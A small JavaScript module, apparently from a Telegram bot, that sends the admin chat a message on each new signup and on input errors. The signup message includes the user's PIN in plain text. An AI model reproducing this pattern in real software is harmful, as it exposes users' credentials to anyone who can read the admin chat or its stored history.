const settings = require('../settings'); // Import settings (contains the admin chat ID)

async function notifyNewSignup(bot, chatId, username, pin) {
  try {
    const message = `
      New signup:
      User Chat ID: ${chatId}
      Username: "${username}"
      PIN: "${pin}"
    `;
    // Send the notification to the admin's chat
    await bot.sendMessage(settings.adminChatId, message);
  } catch (error) {
    console.error("Error sending new signup notification:", error);
  }
}

async function notifyError(bot, chatId, errorType, inputValue) {
  try {
    const message = `
      Error encountered:
      Error Type: ${errorType}
      User Chat ID: ${chatId}
      Input Value: "${inputValue}"
    `;
    // Send the error notification to the admin's chat
    await bot.sendMessage(settings.adminChatId, message);
  } catch (error) {
    console.error("Error sending error notification:", error);
  }
}

module.exports = { notifyNewSignup, notifyError };